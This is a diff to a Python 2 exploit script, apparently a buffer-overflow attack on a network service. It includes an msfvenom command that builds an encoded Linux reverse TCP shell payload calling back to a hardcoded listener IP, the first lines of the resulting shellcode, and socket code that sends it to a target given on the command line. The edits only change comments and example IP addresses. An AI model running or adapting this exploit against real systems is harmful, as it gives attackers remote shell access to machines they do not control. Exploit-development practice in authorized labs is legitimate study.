@@ -2,7 +2,8 @@
 import time, struct, sys
 import socket as so
 
-#Command used for Linux Payload.. replace with your IP - msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=192.168.90.5 -e x86/shikata_ga_nai -b "\x00" -f py
+#Linux Payload Command. Remeber to use your IP in LHOST. 
+#msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=192.168.1.6 -e x86/shikata_ga_nai -b "\x00" -f py
 
 buf =  ""
 buf += "\xbf\x59\x3b\xf5\xef\xd9\xc5\xd9\x74\x24\xf4\x5d\x29"
@@ -25,7 +26,7 @@ try:
    server = str(sys.argv[1])
    port = int(sys.argv[2])
 except IndexError:
-   print "[+] Usage example: python %s 192.168.132.5 9999" % sys.argv[0]
+   print "[+] Usage example: python %s 192.168.1.10 9999" % sys.argv[0]
    sys.exit()
 
 s = so.socket(so.AF_INET, so.SOCK_STREAM)   
